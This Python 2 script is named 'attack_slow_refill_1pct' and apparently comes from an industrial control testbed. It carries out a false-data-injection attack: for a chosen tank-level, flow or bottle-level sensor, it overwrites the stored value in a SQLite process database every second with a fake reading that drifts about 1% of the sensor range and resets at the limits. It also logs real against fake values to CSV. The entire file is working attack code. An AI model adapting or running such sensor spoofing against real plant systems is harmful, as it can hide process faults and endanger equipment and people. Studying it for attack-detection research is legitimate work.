#! /usr/bin/env python2.7
import sqlite3
import time
import sys
import csv
import os
from datetime import datetime as dt

PATH = '/src/fp_db.sqlite'
LOG_DIR = '/src/logs'

TARGETS = {
    # tag, pid, min, max, start/reset value, drift per cycle
    'SENSOR1': ('SENSOR1-LL-tank',    1, 0.3, 5.81, 5.81, 0.0551),
    'SENSOR2': ('SENSOR2-FL',         2, 0.0, 3.0,  0.0,  0.03),
    'SENSOR3': ('SENSOR3-LL-bottle',  3, 0.0, 0.9,  0.0,  0.009),
}

def attack(target, duration_mins):
    if target not in TARGETS:
        print 'Invalid target'
        sys.exit(1)

    tag, pid, min_val, max_val, reset_val, drift = TARGETS[target]
    duration_secs = int(duration_mins) * 60
    end_time = time.time() + duration_secs

    ts = dt.now().strftime('%Y%m%d_%H%M%S')
    csv_file = os.path.join(LOG_DIR, 'slow_refill_1pct_' + target + '_' + ts + '.csv')

    conn = sqlite3.connect(PATH)
    cur = conn.cursor()

    cur.execute('SELECT value FROM fp_table WHERE name=? AND pid=?', (tag, pid))
    row = cur.fetchone()
    real_val = float(row[0]) if row else reset_val

    # SENSOR1 starts high and slowly decreases, then bounces back to max
    if target == 'SENSOR1':
        fake_val = real_val
        direction = 'DOWN'
    else:
        fake_val = real_val
        direction = 'UP'

    pct = round((drift / (max_val - min_val)) * 100, 2)

    print '=' * 60
    print 'SLOW REFILL 1% DRIFT ATTACK'
    print '=' * 60
    print 'Target:      ' + tag
    print 'Range:       ' + str(min_val) + ' to ' + str(max_val)
    print 'Drift:       ' + str(drift) + ' per cycle (' + str(pct) + '% of range)'
    print 'Start fake:  ' + str(fake_val)
    print 'Duration:    ' + str(duration_mins) + ' minutes'
    print 'START:       ' + str(dt.now())
    print '=' * 60
    print 'Cycle | Real value | Fake value | Direction | Diff'
    print '-' * 60

    with open(csv_file, 'wb') as f:
        writer = csv.writer(f)
        writer.writerow(['timestamp', 'cycle', 'real_value', 'fake_value', 'direction', 'difference'])

    cycle = 0

    try:
        while time.time() < end_time:
            cycle += 1

            cur.execute('SELECT value FROM fp_table WHERE name=? AND pid=?', (tag, pid))
            row = cur.fetchone()
            real_val = float(row[0]) if row else min_val

            if target == 'SENSOR1':
                fake_val = round(fake_val - drift, 5)
                direction = 'DOWN'

                if fake_val <= min_val:
                    fake_val = max_val
                    print '[Cycle ' + str(cycle) + '] SENSOR1 RESET to ' + str(max_val)

            else:
                fake_val = round(fake_val + drift, 5)
                direction = 'UP'

                if fake_val >= max_val:
                    fake_val = min_val
                    print '[Cycle ' + str(cycle) + '] RESET to ' + str(min_val)

            cur.execute(
                'UPDATE fp_table SET value=? WHERE name=? AND pid=?',
                (str(fake_val), tag, pid)
            )
            conn.commit()

            diff = round(fake_val - real_val, 5)

            with open(csv_file, 'ab') as f:
                writer = csv.writer(f)
                writer.writerow([str(dt.now()), cycle, real_val, fake_val, direction, diff])

            if cycle % 10 == 0:
                print str(cycle).rjust(5) + ' | ' + \
                      str(round(real_val, 5)).ljust(10) + ' | ' + \
                      str(fake_val).ljust(10) + ' | ' + \
                      direction.ljust(8) + ' | ' + \
                      str(diff)

            time.sleep(1)

    except KeyboardInterrupt:
        print 'Stopped by user'

    conn.close()
    print 'END: ' + str(dt.now())
    print 'CSV: ' + csv_file

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print 'Usage: python attack_slow_refill_1pct.py <target> <duration>'
        print 'Targets: SENSOR1 SENSOR2 SENSOR3'
        print 'Example: python attack_slow_refill_1pct.py SENSOR1 5'
        sys.exit(1)

    attack(sys.argv[1], sys.argv[2])
